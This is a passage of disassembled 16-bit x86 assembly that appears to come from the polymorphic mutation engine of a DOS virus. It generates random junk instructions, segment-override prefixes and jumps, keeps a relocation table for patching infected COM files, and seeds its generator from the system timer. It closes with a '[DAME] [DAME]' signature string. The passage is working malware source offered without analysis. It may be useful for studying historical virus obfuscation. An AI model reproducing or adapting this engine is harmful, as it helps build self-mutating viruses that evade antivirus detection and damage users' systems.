this_is_enabled:			; ...
		mov	ax, 15h
		call	rnd_to_AX	; returns random number	less
					; than AX
		mov	ah, 0EBh	; jmp short
		jz	jmp_short	; is generaded if ax=0
		mov	ah, 0DFh
		add	ah, al		; loop/loope/loopne/jcxz is
		sub	al, 5		; is generated 0<AX<5
		jb	jmp_short	; in all other cases
		mov	ah, 70h		; cond jumps
		add	ah, al

jmp_short:				; ...
		mov	al, ah
		xor	ah, ah		; set lenght of	jmp/loop to 0
		pop	dx		; pop caller
		push	cs:push_counter
		inc	bx
		push	bx		; push pointer to next byte
		dec	bx		; restore pointer
		push	dx		; push caller back
		jmp	short jmp2jmpwritewor

stact_biz:				; ...
		call	prepare_stack

locret_0_8C8:				; ...
		retn

prepare_stack:				; ...
		pop	cs:where_2_jump	; pop return adress
		pop	dx		; pop adress of	caller's caller
		mov	cx, bx		; save pointer to next generated
					; instruction

prepare_stack1:				; ...
		pop	si
		or	si, si		; pop 1st stack	variable
		jz	skip_generation
		pop	ax		; pop 2nd stack	variable
		cmp	cs:stack_watch,	0
		jz	stack_wtch_0
		xchg	ax, cs:push_counter
		sub	ax, cs:push_counter
		call	clear_stack
		jmp	short loc_0_8F9


stack_wtch_0:				; ...
		cmp	ax, cs:push_counter
		jnb	loc_0_8F9
		mov	cs:push_counter, ax

loc_0_8F9:				; ...
		mov	ax, bx
		sub	ax, si
		dec	ax
		cmp	ax, 80h
		jb	loc_0_917
		cmp	cs:stack_watch,	0
		jnz	loc_0_915
		mov	ax, cx
		sub	ax, si
		dec	ax
		cmp	ax, 80h
		jb	loc_0_917

loc_0_915:				; ...
		xor	al, al

loc_0_917:				; ...
		lea	cx, [si-1]
		mov	[si], al
		jmp	short prepare_stack1


skip_generation:			; ...
		push	si
		push	dx

		db 0B8h	; ¸		; MOV AX, word
where_2_jump	dw 0			; ...

		jmp	ax

MOV_POP_MEM:				; ...
		call	try_seg_overrid	; mov memory,AX/L, POP memory
		call	rnd_max_2
		jz	gen_POP_memory

_MOV_m_ALAX:				; ...
		call	rnd_max_2
		or	al, 0A2h	; generate  MOV	mem,AL/AX
		jmp	short jmp2adr2write


gen_POP_memory:				; ...
		mov	ax, cs:push_counter
		cmp	ax, cs:stack_watch
		jz	_MOV_m_ALAX
		dec	cs:push_counter
		mov	al, 8Fh		; POP r/m
		call	write_byte
		mov	al, 110b	; displacement 16 bytes
		jmp	short jmp2adr2write

LG_ARI_MOV_8bit:			; ...
		call	try_seg_overrid	; generate segment override
		mov	ax, 0Ch
		call	rnd_to_AX	; returns random number	less
					; than AX
		xchg	ax, si
		mov	al, cs:gr_lg_artm_mov[si]
		xor	al, 2
		jmp	short write_generated

GRP1_to_GRP3:				; ...
		call	try_seg_overrid	; generate segment override
		call	rnd_max_2
		jz	grp1
		call	rnd_max_2
		or	al, 0FEh	; Grp2 or Grp3
		call	write_byte
		call	rnd_less_100h	; returns 0 - FF
		and	al, 1000b	; clear	mod, reg=001, r/m=0
		or	al, 110b	; displacement 16 bit !

jmp2adr2write:				; ...
		jmp	short adress_2_write; if we write 2 memory, this 'll select correct adress


grp1:					; ...
		call	rnd_max_2
		or	al, 0F6h
		call	write_byte
		call	rnd_less_100h	; returns 0 - FF
		and	al, 1000b	; clear	mod, r/m, set reg &&= 001
		or	al, 10110b	; 16 bit displacement
		jmp	short adress_2_write; if we write 2 memory, this 'll select correct adress


grp_MEM_MEM_iMM:			; ...
		call	try_seg_overrid	; generate segment override
		call	rnd_max_10h	; returns 0 - F
		mov	dl, 0F6h	; Grp1
		jz	put_GRP1
		mov	dl, 0C6h	; MOV mem,imm8 or imm16
		dec	ax
		jz	put_GRP1
		call	rnd_max_4	; returns 0 - 3
		push	ax		; ArOp1	or ArOp2 r/m,imm8 or 16
		or	al, 80h
		call	write_byte
		call	rnd_max_40h	; returns 0 - 3F
		or	al, 7		; set r/m to 7
		dec	ax		; r/m =	6 -> 16bit displacement

add_adr_in_mem:				; ...
		call	adress_2_write	; if we	write 2	memory,	this 'll select correct adress
		pop	ax		; add fake immediate
		dec	ax
		jz	jmp_2_rnd_word
		jmp	rnd_byte


jmp_2_rnd_word:				; ...
		jmp	rnd_word


put_GRP1:				; ...
		call	rnd_max_2
		push	ax
		or	al, dl		; byte or word in memory
		call	write_byte
		mov	al, 6		; 16 bit displacement
		jmp	short add_adr_in_mem


ROTATIONS:				; ...
		call	try_seg_overrid	; generate segment override
		call	rnd_max_4	; returns 0 - 3
		or	al, 0D0h	; rotations

write_generated:			; ...
		call	write_byte
		xchg	ax, dx
		call	rnd_less_100h	; returns 0 - FF
		cmp	dl, 8Ch		; MOV mem,Sreg ?
		jnz	not_sreg
		and	al, 11000b	; only ES,CS,SS,DS

not_sreg:				; ...
		and	al, 111000b	; clear	mod and	r/m field
		or	al, 110b	; displacement 16 bit!

adress_2_write:				; ...
		call	write_byte	; if we	write 2	memory,	this 'll select correct adress

                db 0B8h	; ¸		; MOV AX, word
adress_used	dw 0			; ...

                dec	ax
		jz	cant_generate_0
		call	rnd_to_AX	; returns random number	less
					; than AX
		xchg	ax, dx		; DX = random from ax

		db 0BEh	; ¾		; MOV SI, W
mvd_bdy_200_2	dw 0			; ...

try_it_again:				; ...
		lodsw
		xchg	ax, cx		; CX - value from W (END+200h)
		lodsw			; AX - value from W (END+202h)
		inc	dx
		cmp	dx, cx
		jb	cx_greater_dx
		jz	are_the_same
		dec	dx

are_the_same:				; ...
		add	si, cx
		sub	dx, cx
		jmp	short try_it_again

cx_greater_dx:				; ...
		dec	dx
		add	ax, dx

cant_generate_0:			; ...
		push	di
		push	ax

		db 0BFh	; ¿		; MOV DI, word
table_pointer	dw 0			; ...
					; pointer in table 4 program correction
		stosw			; store	offset in file
		xchg	ax, si
		movsw			; store	word in	table
		mov	cs:table_pointer, di; update table pointer
		pop	ax
		pop	di
		inc	ah		; add 100h for correct offset in
					; COM file
		jmp	write_word	; and write down the address


try_seg_overrid:			; ...
		mov	ax, cs:mvd_bdy_200_2; generate segment override
		sub	ax, cs:table_pointer
		cmp	ax, 6		; check	space left
		jnb	near ptr bytes_left6plus
		pop	ax		; pop caller and return	to caller's
					; caller

locret_0_A23:				; ...
		retn			; not enough space , exit !

bytes_left6plus	db 0B0h	; °		; ...
					; mov al, byte
override_switch	db 0			; ...

		or	al, al
		jz	switch_clear	; s velkym otaznikom
		call	rnd_max_2
		mov	al, 2Eh		; prefix CS:
		jz	CS_selected
		mov	al, 36h		; prefix SS:

CS_selected:				; ...
		jmp	write_byte

switch_clear:				; ...
		mov	al, [bx-1]	; s velkym otaznikom
		and	al, 0E7h	; generate nop in 1 of 256 cases
		cmp	al, 26h		; magic	value (	also opcode ES:	)
		jnz	locret_0_A23	; or exit
		mov	al, 90h		; put NOP
		jmp	short CS_selected

gr_lg_artm_mov	db 10b			; ...
					; ADD r8,r/m
		db 1010b		; OR r8,r/m
		db 10010b		; ADC r8,r/m
		db 11010b		; SBB r8,r/m
		db 100010b		; AND r8,r/m
		db 101010b		; SUB r8,r/m
		db 110010b		; XOR r8,r/m
		db 111000b		; CMP r/m,r8
		db 111010b		; CMP r8,r/m
		db 10000100b		; TEST r/m,r8
		db 10001010b		; MOV r8,r/m
		db 10001110b		; MOV seg,r/m ------
grp_al_im8_r8	db 10100000b		; ...
					; MOV AL,mem8
		db 100b			; ADD AL,im8
		db 1100b		; OR AL,im8
		db 10100b		; ADC AL,im8
		db 11100b		; SBB AL,im8
		db 100100b		; AND AL,im8
		db 101100b		; SUB AL,im8
		db 110100b		; XOR AL,im8
		db 111100b		; CMP AL,im8
		db 10101000b		; TEST AL,im8
LEA_LDS_LES	db 11000101b		; ...
					; LDS r16,mem
		db 11000100b		; LES r16,mem
		db 10001101b		; LEA r16,mem
		db 1011000b		; POP 16bit reg
group_oper_r16	db 1010000b		; ...
					; 1 byte long operations with 16
					; bit registers
					; PUSH 16bit reg
		db 1001000b		; DEC 16 bit reg
		db 1000000b		; INC 16 bit reg
		db 10010000b		; XCHG AX,16 bit reg
					; NOTE:	XCHG AX,AX is called NOP !

trash_byte_tbl:				; ...
		pushf			; table	of 1 byte trash
					; instruction
		daa
		das
		aaa
		aas
		cbw
		cwd
		sahf
		lahf
		cmpsb
		lodsb
		scasb
		xlat
		cmc
		clc
		stc
		cli
		sti
		cld
		std
		cmpsw
		lodsw
		scasw			; end of table


setup_random_se	proc near		; ...
		push	dx		; setup	random seed
		push	cx
		mov	ah, 2Ch
		int	21h		; DH = seconds,	DH=1/100 of seconds
		in	al, 40h		; Timer	8253-5 (AT: 8254.2).
		mov	ah, al
		in	al, 40h		; Timer	8253-5 (AT: 8254.2).
		xor	ax, cx
		xor	dx, ax
		jmp	short put_to_rnd_seed

produce_random:				; ...
		push	dx		; returns AX
		push	cx
		push	bx

		db 0B8h	; ¸		; mov AX, randseed1
random_1	dw 66D0h		; ...
		db 0BAh	; º		; mov DX,randseed2
random_2	dw 66D0h		; ...

		mov	cx, 7

rnd_loop:				; ...
		shl	ax, 1
		rcl	dx, 1
		mov	bl, al
		xor	bl, dh
		jns	sign_bit_clear
		inc	al

sign_bit_clear:				; ...
		loop	rnd_loop
		pop	bx

put_to_rnd_seed:			; ...
		mov	cs:random_1, ax
		mov	cs:random_2, dx
		mov	al, dl
		pop	cx
		pop	dx
		retn
setup_random_se	endp

m_DameDame	db '[DAME] [DAME]'
seg000		ends


		end start
